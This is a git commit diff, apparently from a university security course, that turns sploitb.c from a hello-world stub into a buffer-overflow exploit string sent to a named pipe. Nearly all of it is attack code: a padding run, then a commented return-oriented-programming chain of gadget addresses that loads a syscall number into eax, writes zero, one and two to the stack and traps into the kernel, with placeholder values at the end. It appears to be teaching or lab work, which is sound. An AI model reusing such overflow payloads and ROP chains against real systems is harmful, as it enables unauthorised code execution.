7ad8076253416f11356b1116e5e1826657c9b7a6
jonathandorsey1 <jonathandorsey@utexas.edu>
2020-10-26 17:48:46 -0500

    started sploitb

--- sploitb.c
+++ sploitb.c
@@ -7,7 +7,37 @@
 
 int main(void)
 {
-  writecmd(PIPEPATH, "Hello from sploitb!");
+  writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
+                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
+                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
+                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
+                      "\x09\x09\x09\x09" // no-ops until buffer overflow
+                      "\xbe\xc6\xb6\xbb" // move 85 into eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x2d\xee\xac\xbb" // add 33 to eax
+                      "\x9e\xb1\xb6\xbb" // add 12 to eax; eax now 394
+                      "\xD4\xBE\xB3\xBB" // 0 out edx
+                      "\x22\xA4\xBA\xBB\xEC\x28\xBF\xBF" // pop esp into ecx (future address of 0 word) 
+                      "\x7E\xB8\xB6\xBB" // move edx (0 word) to stack
+                      "\x8a\xb8\xb7\xbb" // inc edx
+                      "\x22\xA4\xBA\xBB\xEC\x28\xBF\xBF" // pop esp into ecx (future address of 1 word) 
+                      "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
+                      "\x8a\xb8\xb7\xbb" // inc edx
+                      "\x22\xA4\xBA\xBB\xEC\x28\xBF\xBF" // pop esp into ecx (future address of 2 word) 
+                      "\x7E\xB8\xB6\xBB" // move edx (2 word) to stack
+                      "\xE5\xB6\xA9\xBB" // trap into kernel
+                      "\x01\x01\x01\x01" // dummy value
+                      "\xaa\xaa\xaa\xaa" // four-byte value 2
+                      "\xaa\xaa\xaa\xaa" // four-byte value 1
+                      "\xaa\xaa\xaa\xaa" // four-byte value 0
+                      );
   
   return 0;
 }
